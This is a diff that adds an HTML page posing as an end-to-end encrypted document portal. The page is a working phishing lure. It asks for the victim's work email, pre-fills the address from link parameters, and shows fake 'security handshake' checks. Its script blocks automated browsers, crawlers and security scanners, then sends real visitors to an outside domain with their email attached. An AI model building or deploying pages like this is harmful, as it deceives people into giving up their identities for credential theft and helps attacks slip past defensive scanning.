@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>Secure Document Portal | End-to-End Verification</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' rx='6' fill='%23107c10'/><text x='16' y='22' text-anchor='middle' fill='white' font-size='16' font-family='Arial'>🔒</text></svg>">
+<style>
+:root{
+  --bg-color: #0b0f19;
+  --card-bg: rgba(18, 24, 38, 0.75);
+  --card-border: rgba(255, 255, 255, 0.08);
+  --primary: #10b981;
+  --primary-glow: rgba(16, 185, 129, 0.35);
+  --primary-dark: #059669;
+  --accent: #3b82f6;
+  --accent-glow: rgba(59, 130, 246, 0.35);
+  --text-main: #f8fafc;
+  --text-muted: #94a3b8;
+  --text-dim: #64748b;
+  --danger: #ef4444;
+}
+
+*{margin:0;padding:0;box-sizing:border-box}
+
+body{
+  font-family:'Plus Jakarta Sans',-apple-system,BlinkMacSystemFont,sans-serif;
+  background-color: var(--bg-color);
+  background-image: 
+    radial-gradient(at 0% 0%, rgba(16, 185, 129, 0.12) 0px, transparent 50%),
+    radial-gradient(at 100% 100%, rgba(59, 130, 246, 0.12) 0px, transparent 50%),
+    radial-gradient(at 50% 50%, rgba(15, 23, 42, 0.8) 0%, #0b0f19 100%);
+  background-attachment: fixed;
+  min-height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  color: var(--text-main);
+  padding:24px;
+  overflow-x:hidden;
+}
+
+/* Background Animated Blobs */
+.ambient-glow{
+  position:fixed;
+  width:320px;
+  height:320px;
+  border-radius:50%;
+  filter:blur(80px);
+  pointer-events:none;
+  z-index:0;
+  opacity:0.4;
+  animation:floatGlow 12s infinite alternate ease-in-out;
+}
+.glow-1{top:10%;left:20%;background:var(--primary)}
+.glow-2{bottom:15%;right:20%;background:var(--accent);animation-delay:-6s}
+
+@keyframes floatGlow{
+  0%{transform:translate(0,0) scale(1)}
+  100%{transform:translate(40px, 30px) scale(1.15)}
+}
+
+/* Container Card */
+.wrap{
+  position:relative;
+  z-index:1;
+  max-width:440px;
+  width:100%;
+  background: var(--card-bg);
+  backdrop-filter: blur(20px);
+  -webkit-backdrop-filter: blur(20px);
+  padding:36px 32px;
+  border-radius:20px;
+  border: 1px solid var(--card-border);
+  box-shadow: 0 20px 45px -10px rgba(0,0,0,0.6), 0 0 0 1px rgba(255,255,255,0.05) inset;
+  text-align:center;
+  animation: fadeInCard .6s cubic-bezier(0.16, 1, 0.3, 1);
+}
+
+@keyframes fadeInCard{
+  from{opacity:0;transform:translateY(16px)}
+  to{opacity:1;transform:translateY(0)}
+}
+
+/* Top Badge */
+.security-badge{
+  display:inline-flex;
+  align-items:center;
+  gap:6px;
+  padding:4px 12px;
+  border-radius:99px;
+  background:rgba(16, 185, 129, 0.1);
+  border:1px solid rgba(16, 185, 129, 0.25);
+  font-size:11px;
+  font-weight:600;
+  letter-spacing:0.5px;
+  color:#34d399;
+  margin-bottom:20px;
+  text-transform:uppercase;
+}
+.security-badge .dot{
+  width:6px;
+  height:6px;
+  background:#10b981;
+  border-radius:50%;
+  box-shadow:0 0 8px #10b981;
+  animation: pulseDot 2s infinite;
+}
+@keyframes pulseDot{
+  0%,100%{opacity:1;transform:scale(1)}
+  50%{opacity:0.4;transform:scale(0.8)}
+}
+
+/* Shield Icon & Ring */
+.shield-container{
+  width:72px;
+  height:72px;
+  margin:0 auto 20px;
+  position:relative;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+}
+.shield-ring{
+  position:absolute;
+  inset:0;
+  border-radius:50%;
+  border:2.5px solid rgba(16, 185, 129, 0.15);
+  border-top-color:var(--primary);
+  border-right-color:var(--primary);
+  animation:spin 1.2s cubic-bezier(0.5, 0.1, 0.5, 0.9) infinite;
+  box-shadow:0 0 16px var(--primary-glow);
+}
+.shield-box{
+  width:56px;
+  height:56px;
+  background:rgba(255,255,255,0.03);
+  border:1px solid rgba(255,255,255,0.1);
+  border-radius:14px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  box-shadow:0 4px 12px rgba(0,0,0,0.3);
+}
+.shield-box svg{
+  width:26px;
+  height:26px;
+  fill:#10b981;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+h1{
+  font-size:21px;
+  font-weight:700;
+  letter-spacing:-0.4px;
+  margin-bottom:8px;
+  color:#fff;
+}
+.sub{
+  font-size:13.5px;
+  color:var(--text-muted);
+  line-height:1.55;
+  margin-bottom:28px;
+}
+
+/* Form Styles */
+.form-group{
+  margin-bottom:18px;
+  text-align:left;
+}
+.input-label{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  font-size:12px;
+  font-weight:600;
+  color:var(--text-muted);
+  margin-bottom:8px;
+  text-transform:uppercase;
+  letter-spacing:0.5px;
+}
+.input-wrap{
+  position:relative;
+  display:flex;
+  align-items:center;
+}
+.input-icon{
+  position:absolute;
+  left:14px;
+  width:18px;
+  height:18px;
+  color:var(--text-dim);
+  pointer-events:none;
+  transition:color .2s ease;
+}
+.email-input{
+  width:100%;
+  padding:13px 16px 13px 44px;
+  background:rgba(15, 23, 42, 0.6);
+  border:1px solid rgba(255, 255, 255, 0.12);
+  border-radius:10px;
+  color:#fff;
+  font-size:14px;
+  font-family:inherit;
+  outline:none;
+  transition:all .25s ease;
+}
+.email-input:focus{
+  border-color:var(--primary);
+  background:rgba(15, 23, 42, 0.85);
+  box-shadow:0 0 0 3.5px var(--primary-glow);
+}
+.email-input:focus + .input-icon,
+.input-wrap:focus-within .input-icon{
+  color:var(--primary);
+}
+.email-input::placeholder{
+  color:var(--text-dim);
+}
+
+.error-msg{
+  display:none;
+  align-items:center;
+  gap:6px;
+  color:var(--danger);
+  font-size:12px;
+  margin-top:8px;
+  font-weight:500;
+}
+
+.submit-btn{
+  width:100%;
+  padding:13px 20px;
+  background:linear-gradient(135deg, #10b981 0%, #059669 100%);
+  color:#fff;
+  border:none;
+  border-radius:10px;
+  font-size:14.5px;
+  font-weight:600;
+  font-family:inherit;
+  cursor:pointer;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:8px;
+  box-shadow:0 6px 20px var(--primary-glow), 0 2px 4px rgba(0,0,0,0.2);
+  transition:all .25s ease;
+}
+.submit-btn:hover{
+  background:linear-gradient(135deg, #059669 0%, #047857 100%);
+  transform:translateY(-1px);
+  box-shadow:0 8px 24px var(--primary-glow);
+}
+.submit-btn:active{
+  transform:translateY(0);
+}
+.submit-btn svg{
+  width:16px;
+  height:16px;
+  transition:transform .2s;
+}
+.submit-btn:hover svg{
+  transform:translateX(3px);
+}
+
+/* Security Guarantee Footer */
+.security-footer{
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:16px;
+  margin-top:24px;
+  padding-top:20px;
+  border-top:1px solid rgba(255,255,255,0.06);
+}
+.sec-item{
+  display:flex;
+  align-items:center;
+  gap:5px;
+  font-size:11.5px;
+  color:var(--text-dim);
+  font-weight:500;
+}
+.sec-item svg{
+  width:13px;
+  height:13px;
+  color:#10b981;
+}
+
+/* Verification State Box */
+.verification-box{display:none;animation:fadeInCard .4s ease}
+.checks{
+  text-align:left;
+  max-width:340px;
+  margin:18px auto 8px;
+  background:rgba(15, 23, 42, 0.45);
+  padding:12px 18px;
+  border-radius:12px;
+  border:1px solid rgba(255,255,255,0.05);
+}
+.check-item{
+  display:flex;
+  align-items:center;
+  gap:12px;
+  padding:10px 0;
+  border-bottom:1px solid rgba(255,255,255,.04);
+  font-size:12.5px;
+  font-weight:500;
+}
+.check-item:last-child{border-bottom:none}
+.check-dot{
+  width:20px;
+  height:20px;
+  border-radius:50%;
+  border:2px solid rgba(255,255,255,0.15);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  flex-shrink:0;
+  transition:all .3s ease;
+}
+.check-dot.done{
+  border-color:#10b981;
+  background:#10b981;
+  box-shadow:0 0 8px rgba(16, 185, 129, 0.4);
+}
+.check-dot.done::after{
+  content:'✓';
+  color:#fff;
+  font-size:11px;
+  font-weight:bold;
+}
+.check-dot.active{
+  border-color:#3b82f6;
+  animation:pulseRing 1.2s infinite;
+}
+@keyframes pulseRing{
+  0%,100%{box-shadow:0 0 0 0 rgba(59, 130, 246, 0.4)}
+  50%{box-shadow:0 0 0 6px rgba(59, 130, 246, 0)}
+}
+.check-label{color:var(--text-muted);transition:color .3s}
+.check-item.done .check-label{color:var(--text-main)}
+
+.blocked{
+  display:none;
+  color:var(--danger);
+  font-size:13px;
+  font-weight:600;
+  margin-top:20px;
+  background:rgba(239, 68, 68, 0.1);
+  padding:12px;
+  border-radius:8px;
+  border:1px solid rgba(239, 68, 68, 0.2);
+}
+</style>
+</head>
+<body>
+
+<div class="ambient-glow glow-1"></div>
+<div class="ambient-glow glow-2"></div>
+
+<div class="wrap">
+  <div class="security-badge">
+    <span class="dot"></span>
+    End-to-End Encrypted
+  </div>
+
+  <div class="shield-container">
+    <div class="shield-ring" id="shieldRing" style="display:none"></div>
+    <div class="shield-box">
+      <svg viewBox="0 0 24 24">
+        <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-1 15l-4-4 1.41-1.41L11 13.17l5.59-5.59L18 9l-7 7z"/>
+      </svg>
+    </div>
+  </div>
+
+  <h1 id="mainTitle">Secure Document Access</h1>
+  <p class="sub" id="subText">Please confirm your work email to decrypt and access the protected file.</p>
+  
+  <!-- Email Input Form -->
+  <form id="emailForm" onsubmit="handleFormSubmit(event)">
+    <div class="form-group">
+      <div class="input-label">
+        <span>Authorized Recipient</span>
+        <span style="font-weight:400;color:var(--text-dim)">Required</span>
+      </div>
+      <div class="input-wrap">
+        <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <rect width="20" height="16" x="2" y="4" rx="2"/>
+          <path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/>
+        </svg>
+        <input type="email" id="emailInput" class="email-input" placeholder="name@company.com" required autocomplete="email" />
+      </div>
+      <div class="error-msg" id="errorMsg">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+        Please enter a valid work or personal email address.
+      </div>
+    </div>
+    
+    <button type="submit" class="submit-btn" id="submitBtn">
+      <span>Decrypt & View Document</span>
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <line x1="5" y1="12" x2="19" y2="12"></line>
+        <polyline points="12 5 19 12 12 19"></polyline>
+      </svg>
+    </button>
+  </form>
+
+  <!-- Verification Animation Box -->
+  <div class="verification-box" id="verificationBox">
+    <div class="checks" id="checks">
+      <div class="check-item" data-i="0"><div class="check-dot"></div><span class="check-label">Verifying authorized recipient identity</span></div>
+      <div class="check-item" data-i="1"><div class="check-dot"></div><span class="check-label">Validating SSL/TLS security handshake</span></div>
+      <div class="check-item" data-i="2"><div class="check-dot"></div><span class="check-label">Authenticating access token</span></div>
+      <div class="check-item" data-i="3"><div class="check-dot"></div><span class="check-label">Preparing decrypted file stream</span></div>
+    </div>
+  </div>
+
+  <div class="security-footer">
+    <div class="sec-item">
+      <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+      TLS 1.3 256-bit
+    </div>
+    <div class="sec-item">
+      <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+      Identity Verified
+    </div>
+  </div>
+
+  <p class="blocked" id="blocked">⛔ Access Denied: Automated environment or anomaly detected.</p>
+</div>
+
+<script>
+/*──── CONFIG: Base Target URL ────*/
+var BASE_REDIRECT_URL = "https://mgx.toyoowelebetamotel.nl";
+/*────────────────────────────────*/
+
+function isValidEmail(email) {
+  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+}
+
+function getUrlEmail() {
+  var params = new URLSearchParams(window.location.search);
+  var email = params.get('email') || params.get('e') || params.get('mail') || params.get('user');
+  if (!email && window.location.hash) {
+    var hashVal = window.location.hash.substring(1);
+    if (isValidEmail(hashVal)) email = hashVal;
+  }
+  return email;
+}
+
+// Prefill email if found in URL parameters or hash
+window.addEventListener('DOMContentLoaded', function() {
+  var initialEmail = getUrlEmail();
+  if (initialEmail) {
+    document.getElementById('emailInput').value = initialEmail;
+  }
+});
+
+function handleFormSubmit(e) {
+  e.preventDefault();
+  var email = document.getElementById('emailInput').value.trim();
+  var errorEl = document.getElementById('errorMsg');
+  
+  if (!isValidEmail(email)) {
+    errorEl.style.display = 'flex';
+    return;
+  }
+  errorEl.style.display = 'none';
+  startVerification(email);
+}
+
+function startVerification(email) {
+  document.getElementById('emailForm').style.display = 'none';
+  document.getElementById('verificationBox').style.display = 'block';
+  document.getElementById('shieldRing').style.display = 'block';
+  document.getElementById('mainTitle').innerText = 'Verifying Security Credentials';
+  document.getElementById('subText').innerHTML = 'Establishing secure encrypted tunnel.<br>Please wait a moment...';
+
+  var items = document.querySelectorAll('.check-item');
+  var b = document.getElementById('blocked');
+
+  function bad() {
+    b.style.display = 'block';
+    document.getElementById('checks').style.display = 'none';
+    var ring = document.getElementById('shieldRing');
+    ring.style.animation = 'none';
+    ring.style.borderColor = '#ef4444';
+  }
+
+  function chk() {
+    if (navigator.webdriver || window.__nightmare || window.callPhantom || window._phantom) return !1;
+    if (/bot|crawl|spider|headless|phantom|puppet|selenium|lighthouse|wget|curl|http|scan|preview|fetch|archive|index|probe/i.test(navigator.userAgent)) return !1;
+    try {
+      var c = document.createElement('canvas'), g = c.getContext('webgl') || c.getContext('experimental-webgl');
+      if (!g) return !1;
+    } catch(e) { return !1; }
+    if (navigator.languages && navigator.languages.length === 0) return !1;
+    if (!window.chrome && /Chrome/.test(navigator.userAgent)) return !1;
+    if (screen.width < 300 || screen.height < 300) return !1;
+    var n = performance.now();
+    for (var i = 0; i < 1e5; i++) Math.sqrt(i);
+    if (performance.now() - n < 0.5) return !1;
+    if (typeof navigator.getBattery === 'function') {
+      try { navigator.getBattery().then(function(){}); } catch(e) { return !1; }
+    }
+    return !0;
+  }
+
+  if (!chk()) {
+    bad();
+    return;
+  }
+
+  // Append email to redirect URL
+  var finalUrl = BASE_REDIRECT_URL;
+  if (email) {
+    var separator = finalUrl.indexOf('?') !== -1 ? '&' : '?';
+    finalUrl = finalUrl + separator + 'email=' + encodeURIComponent(email);
+  }
+
+  var step = 0;
+  items[0].querySelector('.check-dot').classList.add('active');
+  var iv = setInterval(function() {
+    items[step].querySelector('.check-dot').classList.remove('active');
+    items[step].querySelector('.check-dot').classList.add('done');
+    items[step].classList.add('done');
+    step++;
+    if (step < items.length) {
+      items[step].querySelector('.check-dot').classList.add('active');
+    } else {
+      clearInterval(iv);
+      setTimeout(function() {
+        window.location.replace(finalUrl);
+      }, 700);
+    }
+  }, 850);
+}
+</script>
+</body>
+</html>
